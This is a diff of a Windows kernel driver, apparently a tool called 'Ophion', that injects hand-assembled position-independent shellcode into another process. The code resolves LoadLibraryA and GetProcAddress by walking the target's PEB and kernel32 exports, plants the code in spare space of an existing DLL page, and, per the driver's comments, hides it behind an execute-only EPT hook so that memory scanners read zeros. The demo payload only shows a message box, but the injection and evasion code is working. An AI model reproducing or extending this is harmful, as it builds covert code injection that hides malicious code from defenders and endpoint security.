@@ -261,152 +261,165 @@ typedef struct _TD_R3_UNHOOK_PARAMS {
 //   (see byte array below — hand-assembled and verified)
 //
 
-// ---- Data-driven shellcode (split code/data) ----
+// ---- PIC shellcode (fully self-contained) ----
 //
-// Code page (EPT execute-only, R=0): only instructions, no embedded data.
-// Data lives in the trampoline page (separate VA, normal RWX, not EPT hooked).
-// This allows changed_entry R=0 → memory scanners read zeros from code page.
+// all data encoded as instructions — strings built on stack, function
+// pointers embedded as mov reg, imm64 (patched at build time).
+// zero external data references. no tramp_va / data page needed.
 //
-// Code page layout:
-//   +0x000: shellcode stub (code only)
+// patch offsets:
+//   +6:  pLoadLibraryA  (8 bytes, mov r12 imm64)
+//   +16: pGetProcAddress (8 bytes, mov r13 imm64)
 //
-// Trampoline page layout:
-//   +0x000: [saved bytes] + [abs jmp back]   (trampoline code, 18 bytes)
-//   +0x100: UINT64  pLoadLibraryA
-//   +0x108: UINT64  pGetProcAddress
-//   +0x110: char    "user32.dll\0"
-//   +0x120: char    "MessageBoxA\0"
-//   +0x130: char    "Ophion Stealth!\0"
-//   +0x140: char    "Ophion\0"
-//
-// shellcode uses: mov rbp, <absolute tramp_va + 0x100>  (patched at runtime)
-//
+static const UINT8 g_shellcode_pic[] = {
+    // --- prologue ---
+    0x48, 0x83, 0xEC, 0x28,                                    // sub rsp, 28h
 
-// stub: rbp loaded with absolute data pointer (patched at build time)
-// offset 7-14: 8 bytes to be patched with tramp_va + 0x100
-static const UINT8 g_shellcode_stub[] = {
-    0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 28h         ; align stack
-    0x48, 0xBD,                                     // mov rbp, imm64       ; (6 bytes opcode+prefix)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // imm64 placeholder   ; patched to tramp_va+0x100
+    // mov r12, pLoadLibraryA (patched at offset 6)
+    0x49, 0xBC,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,            // [6..13]
 
-    // LoadLibraryA("user32.dll")
-    0x48, 0x8B, 0x45, 0x00,                         // mov rax, [rbp+0]     ; pLoadLibraryA
-    0x48, 0x8D, 0x4D, 0x10,                         // lea rcx, [rbp+10h]   ; "user32.dll"
-    0x48, 0x83, 0xEC, 0x20,                         // sub rsp, 20h
-    0xFF, 0xD0,                                     // call rax
-    0x48, 0x83, 0xC4, 0x20,                         // add rsp, 20h
+    // mov r13, pGetProcAddress (patched at offset 16)
+    0x49, 0xBD,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,            // [16..23]
 
-    // GetProcAddress(user32, "MessageBoxA")
-    0x48, 0x89, 0xC1,                               // mov rcx, rax         ; user32 handle
-    0x48, 0x8B, 0x45, 0x08,                         // mov rax, [rbp+8]     ; pGetProcAddress
-    0x48, 0x8D, 0x55, 0x20,                         // lea rdx, [rbp+20h]   ; "MessageBoxA"
-    0x48, 0x83, 0xEC, 0x20,                         // sub rsp, 20h
-    0xFF, 0xD0,                                     // call rax
-    0x48, 0x83, 0xC4, 0x20,                         // add rsp, 20h
+    // sub rsp, 80h (strings + shadow space)
+    0x48, 0x81, 0xEC, 0x80, 0x00, 0x00, 0x00,                  // [24..30]
 
-    // MessageBoxA(NULL, "Ophion Stealth!", "Ophion", MB_OK)
-    0x48, 0x89, 0xC3,                               // mov rbx, rax         ; MessageBoxA
-    0x48, 0x31, 0xC9,                               // xor rcx, rcx         ; hWnd = NULL
-    0x48, 0x8D, 0x55, 0x30,                         // lea rdx, [rbp+30h]   ; "Ophion Stealth!"
-    0x4C, 0x8D, 0x45, 0x40,                         // lea r8, [rbp+40h]    ; "Ophion"
-    0x45, 0x31, 0xC9,                               // xor r9d, r9d         ; uType = 0
-    0x48, 0x83, 0xEC, 0x20,                         // sub rsp, 20h
-    0xFF, 0xD3,                                     // call rbx
-    0x48, 0x83, 0xC4, 0x20,                         // add rsp, 20h
+    // --- build "user32.dll\0" at [rsp+20h] ---
+    0xC7, 0x44, 0x24, 0x20,  0x75, 0x73, 0x65, 0x72,           // "user"
+    0xC7, 0x44, 0x24, 0x24,  0x33, 0x32, 0x2E, 0x64,           // "32.d"
+    0x66, 0xC7, 0x44, 0x24, 0x28,  0x6C, 0x6C,                 // "ll"
+    0xC6, 0x44, 0x24, 0x2A,  0x00,                              // \0
 
-    0x48, 0x83, 0xC4, 0x28,                         // add rsp, 28h
-    0xC3,                                           // ret
+    // --- LoadLibraryA("user32.dll") ---
+    0x48, 0x8D, 0x4C, 0x24, 0x20,                               // lea rcx, [rsp+20h]
+    0x41, 0xFF, 0xD4,                                            // call r12
+    0x48, 0x89, 0xC6,                                            // mov rsi, rax
+
+    // --- build "MessageBoxA\0" at [rsp+30h] ---
+    0xC7, 0x44, 0x24, 0x30,  0x4D, 0x65, 0x73, 0x73,           // "Mess"
+    0xC7, 0x44, 0x24, 0x34,  0x61, 0x67, 0x65, 0x42,           // "ageB"
+    0xC7, 0x44, 0x24, 0x38,  0x6F, 0x78, 0x41, 0x00,           // "oxA\0"
+
+    // --- GetProcAddress(user32, "MessageBoxA") ---
+    0x48, 0x89, 0xF1,                                            // mov rcx, rsi
+    0x48, 0x8D, 0x54, 0x24, 0x30,                               // lea rdx, [rsp+30h]
+    0x41, 0xFF, 0xD5,                                            // call r13
+    0x48, 0x89, 0xC3,                                            // mov rbx, rax
+
+    // --- build "Ophion Stealth!\0" at [rsp+40h] ---
+    0xC7, 0x44, 0x24, 0x40,  0x4F, 0x70, 0x68, 0x69,           // "Ophi"
+    0xC7, 0x44, 0x24, 0x44,  0x6F, 0x6E, 0x20, 0x53,           // "on S"
+    0xC7, 0x44, 0x24, 0x48,  0x74, 0x65, 0x61, 0x6C,           // "teal"
+    0xC7, 0x44, 0x24, 0x4C,  0x74, 0x68, 0x21, 0x00,           // "th!\0"
+
+    // --- build "Ophion\0" at [rsp+60h] ---
+    0xC7, 0x44, 0x24, 0x60,  0x4F, 0x70, 0x68, 0x69,           // "Ophi"
+    0x66, 0xC7, 0x44, 0x24, 0x64,  0x6F, 0x6E,                 // "on"
+    0xC6, 0x44, 0x24, 0x66,  0x00,                              // \0
+
+    // --- MessageBoxA(NULL, "Ophion Stealth!", "Ophion", 0) ---
+    0x48, 0x31, 0xC9,                                            // xor rcx, rcx
+    0x48, 0x8D, 0x54, 0x24, 0x40,                               // lea rdx, [rsp+40h]
+    0x4C, 0x8D, 0x44, 0x24, 0x60,                               // lea r8, [rsp+60h]
+    0x45, 0x31, 0xC9,                                            // xor r9d, r9d
+    0xFF, 0xD3,                                                   // call rbx
+
+    // --- epilogue ---
+    0x48, 0x81, 0xC4, 0x80, 0x00, 0x00, 0x00,                  // add rsp, 80h
+    0x48, 0x83, 0xC4, 0x28,                                      // add rsp, 28h
+    0xC3,                                                         // ret
 };
 
-//
-// build shellcode code page: stub only, NO data.
-// data_va = absolute address of data area (on trampoline page).
-// must be called while attached to the target process.
-//
-static VOID
-TdBuildShellcodePage(PVOID buf, UINT64 data_va)
-{
-    // zero only the shellcode area (buf may not be page-aligned for gap mode)
-    RtlZeroMemory(buf, sizeof(g_shellcode_stub));
-
-    // copy stub
-    RtlCopyMemory(buf, g_shellcode_stub, sizeof(g_shellcode_stub));
-
-    // patch mov rbp, imm64 — write absolute data_va at offset 6
-    *(PUINT64)((PUINT8)buf + 6) = data_va;
-}
+#define PIC_PATCH_LOADLIBRARY   6       // offset of pLoadLibraryA imm64
+#define PIC_PATCH_GETPROCADDR   16      // offset of pGetProcAddress imm64
 
 //
-// build data block on the trampoline page at +0x100.
+// build PIC shellcode: resolve kernel32 exports and patch into shellcode.
 // must be called while attached to the target process (PEB walk).
 //
-static VOID
-TdBuildDataBlock(PVOID tramp_base)
+static BOOLEAN
+TdBuildShellcodePIC(PVOID buf, SIZE_T buf_size)
 {
-    PUINT8 data = (PUINT8)tramp_base + 0x100;
+    PPEB peb;
+    TD_PEB_LDR_DATA * ldr;
+    PLIST_ENTRY head, cur;
+    TD_LDR_ENTRY * e;
+    PVOID kernel32_base;
+    PIMAGE_DOS_HEADER dos_h;
+    PIMAGE_NT_HEADERS64 nt_h;
+    PIMAGE_EXPORT_DIRECTORY exp_d;
+    PULONG names_arr, funcs_arr;
+    PUSHORT ords_arr;
+    ULONG exp_rva, i;
+    UINT64 pLoadLib, pGetProc;
+    const char * fn;
 
-    PPEB peb = PsGetProcessPeb(PsGetCurrentProcess());
-    if (!peb) return;
+    if (buf_size < sizeof(g_shellcode_pic)) return FALSE;
+
+    RtlZeroMemory(buf, sizeof(g_shellcode_pic));
+    RtlCopyMemory(buf, g_shellcode_pic, sizeof(g_shellcode_pic));
+
+    peb = PsGetProcessPeb(PsGetCurrentProcess());
+    if (!peb) return FALSE;
+
+    pLoadLib = 0;
+    pGetProc = 0;
+    kernel32_base = NULL;
 
     __try {
-        TD_PEB_LDR_DATA * ldr = *(TD_PEB_LDR_DATA **)((PUINT8)peb + 0x18);
-        if (!ldr) return;
+        ldr = *(TD_PEB_LDR_DATA **)((PUINT8)peb + 0x18);
+        if (!ldr) return FALSE;
 
-        PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
-        PLIST_ENTRY cur  = head->Flink;
-        PVOID kernel32_base = NULL;
+        head = &ldr->InMemoryOrderModuleList;
+        cur = head->Flink;
 
         while (cur != head)
         {
-            TD_LDR_ENTRY * e = CONTAINING_RECORD(cur, TD_LDR_ENTRY, InMemoryOrderLinks);
-            if (e->BaseDllName.Buffer && e->BaseDllName.Length >= 20)
+            e = CONTAINING_RECORD(cur, TD_LDR_ENTRY, InMemoryOrderLinks);
+            if (e->BaseDllName.Buffer &&
+                TdMatchDllName(e->BaseDllName.Buffer, e->BaseDllName.Length, g_k32_name, 12))
             {
-                BOOLEAN match = TRUE;
-                const WCHAR target[] = L"kernel32.dll";
-                for (USHORT i = 0; i < 12; i++)
-                {
-                    WCHAR c = e->BaseDllName.Buffer[i];
-                    if (c >= L'A' && c <= L'Z') c += 32;
-                    if (c != target[i]) { match = FALSE; break; }
-                }
-                if (match) { kernel32_base = e->DllBase; break; }
+                kernel32_base = e->DllBase;
+                break;
             }
             cur = cur->Flink;
         }
 
-        if (!kernel32_base) return;
+        if (!kernel32_base) return FALSE;
 
-        PIMAGE_DOS_HEADER dos_h = (PIMAGE_DOS_HEADER)kernel32_base;
-        PIMAGE_NT_HEADERS64 nt_h = (PIMAGE_NT_HEADERS64)((PUINT8)kernel32_base + dos_h->e_lfanew);
-        ULONG exp_rva = nt_h->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-        PIMAGE_EXPORT_DIRECTORY exp_d = (PIMAGE_EXPORT_DIRECTORY)((PUINT8)kernel32_base + exp_rva);
+        dos_h = (PIMAGE_DOS_HEADER)kernel32_base;
+        nt_h = (PIMAGE_NT_HEADERS64)((PUINT8)kernel32_base + dos_h->e_lfanew);
+        exp_rva = nt_h->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+        exp_d = (PIMAGE_EXPORT_DIRECTORY)((PUINT8)kernel32_base + exp_rva);
 
-        PULONG  names_arr    = (PULONG)((PUINT8)kernel32_base + exp_d->AddressOfNames);
-        PUSHORT ordinals_arr = (PUSHORT)((PUINT8)kernel32_base + exp_d->AddressOfNameOrdinals);
-        PULONG  funcs_arr    = (PULONG)((PUINT8)kernel32_base + exp_d->AddressOfFunctions);
+        names_arr = (PULONG)((PUINT8)kernel32_base + exp_d->AddressOfNames);
+        ords_arr  = (PUSHORT)((PUINT8)kernel32_base + exp_d->AddressOfNameOrdinals);
+        funcs_arr = (PULONG)((PUINT8)kernel32_base + exp_d->AddressOfFunctions);
 
-        UINT64 pLoadLibraryA = 0, pGetProcAddress = 0;
-
-        for (ULONG i = 0; i < exp_d->NumberOfNames; i++)
+        for (i = 0; i < exp_d->NumberOfNames; i++)
         {
-            const char * fn = (const char *)((PUINT8)kernel32_base + names_arr[i]);
-            if (!pLoadLibraryA && strcmp(fn, "LoadLibraryA") == 0)
-                pLoadLibraryA = (UINT64)kernel32_base + funcs_arr[ordinals_arr[i]];
-            if (!pGetProcAddress && strcmp(fn, "GetProcAddress") == 0)
-                pGetProcAddress = (UINT64)kernel32_base + funcs_arr[ordinals_arr[i]];
-            if (pLoadLibraryA && pGetProcAddress) break;
+            fn = (const char *)((PUINT8)kernel32_base + names_arr[i]);
+            if (!pLoadLib && strcmp(fn, "LoadLibraryA") == 0)
+                pLoadLib = (UINT64)kernel32_base + funcs_arr[ords_arr[i]];
+            if (!pGetProc && strcmp(fn, "GetProcAddress") == 0)
+                pGetProc = (UINT64)kernel32_base + funcs_arr[ords_arr[i]];
+            if (pLoadLib && pGetProc) break;
         }
-
-        *(PUINT64)(data + 0x00) = pLoadLibraryA;
-        *(PUINT64)(data + 0x08) = pGetProcAddress;
-        RtlCopyMemory(data + 0x10, "user32.dll",       11);
-        RtlCopyMemory(data + 0x20, "MessageBoxA",      12);
-        RtlCopyMemory(data + 0x30, "Ophion Stealth!",  16);
-        RtlCopyMemory(data + 0x40, "Ophion",            7);
-
     } __except (EXCEPTION_EXECUTE_HANDLER) {
-        // PEB walk failed silently
+        return FALSE;
     }
+
+    if (!pLoadLib || !pGetProc) return FALSE;
+
+    // patch immediates
+    *(PUINT64)((PUINT8)buf + PIC_PATCH_LOADLIBRARY) = pLoadLib;
+    *(PUINT64)((PUINT8)buf + PIC_PATCH_GETPROCADDR) = pGetProc;
+
+    DbgPrintEx(0, 0, "[td] PIC: LoadLibraryA=%llx GetProcAddress=%llx size=%u\n",
+               pLoadLib, pGetProc, (UINT32)sizeof(g_shellcode_pic));
+    return TRUE;
 }
 
 // =========================================================================
@@ -1419,7 +1432,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         // tail of a section's last page. no new allocation, no new VAD.
         // original page content preserved (real DLL code stays in front).
         //
-        PVOID base = TdFindGapInProcess(sizeof(g_shellcode_stub) + 32, &gap_offset, &gap_avail);
+        PVOID base = TdFindGapInProcess(sizeof(g_shellcode_pic) + 32, &gap_offset, &gap_avail);
         if (base)
         {
             used_gap = TRUE;
@@ -1448,31 +1461,6 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         DbgPrintEx(0, 0, "[td] inject: VA=%p offset=0x%X pid=%llu gap=%d\n",
                    base, gap_offset, p->target_pid, used_gap);
 
-        // --- step 1: allocate data page (PAGE_READWRITE, no execute) ---
-        //
-        // tramp_va holds ONLY data (+0x100). NO code — trampoline code lives
-        // inside the shadow page at offset 0xF00 (EPT X-only, hidden).
-        // PAGE_READWRITE: no RWX allocation, clean VAD.
-        //
-        PVOID tramp_va = NULL;
-        SIZE_T tramp_size = PAGE_SIZE;
-        NTSTATUS tramp_st = ZwAllocateVirtualMemory(
-            ZwCurrentProcess(), &tramp_va, 0, &tramp_size,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-        if (!NT_SUCCESS(tramp_st) || !tramp_va)
-        {
-            if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
-            KeUnstackDetachProcess(&apc_state);
-            ObDereferenceObject(proc);
-            st = STATUS_INSUFFICIENT_RESOURCES;
-            break;
-        }
-        RtlZeroMemory(tramp_va, tramp_size);
-
-        // --- step 2: build data block on data page ---
-        TdBuildDataBlock(tramp_va);
-
         UINT64 caller_cr3 = __readcr3();
 
         //
@@ -1491,7 +1479,6 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         PVOID fake_buf = ExAllocatePool2(POOL_FLAG_NON_PAGED, PAGE_SIZE, 'kjnI');
         if (!fake_buf)
         {
-            ZwFreeVirtualMemory(ZwCurrentProcess(), &tramp_va, &tramp_size, MEM_RELEASE);
             if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
             KeUnstackDetachProcess(&apc_state);
             ObDereferenceObject(proc);
@@ -1537,8 +1524,18 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         // copy original page content (DLL code in front, zeros in padding)
         RtlCopyMemory(fake_buf, base, PAGE_SIZE);
 
-        // build shellcode at gap_offset inside fake_buf
-        TdBuildShellcodePage((PUINT8)fake_buf + gap_offset, (UINT64)tramp_va + 0x100);
+        // build PIC shellcode at gap_offset inside fake_buf
+        if (!TdBuildShellcodePIC((PUINT8)fake_buf + gap_offset, PAGE_SIZE - gap_offset))
+        {
+            RtlSecureZeroMemory(fake_buf, PAGE_SIZE);
+            ExFreePoolWithTag(fake_buf, 'kjnI');
+            if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
+            KeUnstackDetachProcess(&apc_state);
+            ObDereferenceObject(proc);
+            st = STATUS_UNSUCCESSFUL;
+            DbgPrintEx(0, 0, "[td] inject: PIC shellcode build failed\n");
+            break;
+        }
 
         if (!used_gap)
         {
@@ -1552,7 +1549,6 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
 
         if (!base_phys)
         {
-            ZwFreeVirtualMemory(ZwCurrentProcess(), &tramp_va, &tramp_size, MEM_RELEASE);
             RtlSecureZeroMemory(fake_buf, PAGE_SIZE);
             ExFreePoolWithTag(fake_buf, 'kjnI');
             if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
@@ -1673,8 +1669,8 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
                 he->active          = TRUE;
                 he->target_pid      = p->target_pid;
                 he->target_va       = base;
-                he->trampoline_va   = tramp_va;
-                he->trampoline_size = tramp_size;
+                he->trampoline_va   = NULL;
+                he->trampoline_size = 0;
                 he->target_mdl      = NULL;
                 he->target_cr3      = caller_cr3;
             }
@@ -1687,7 +1683,6 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         else
         {
             DbgPrintEx(0, 0, "[td] inject: EPT hook FAILED\n");
-            ZwFreeVirtualMemory(ZwCurrentProcess(), &tramp_va, &tramp_size, MEM_RELEASE);
             if (!used_gap) ZwFreeVirtualMemory(ZwCurrentProcess(), &base, &size, MEM_RELEASE);
             st = STATUS_UNSUCCESSFUL;
         }
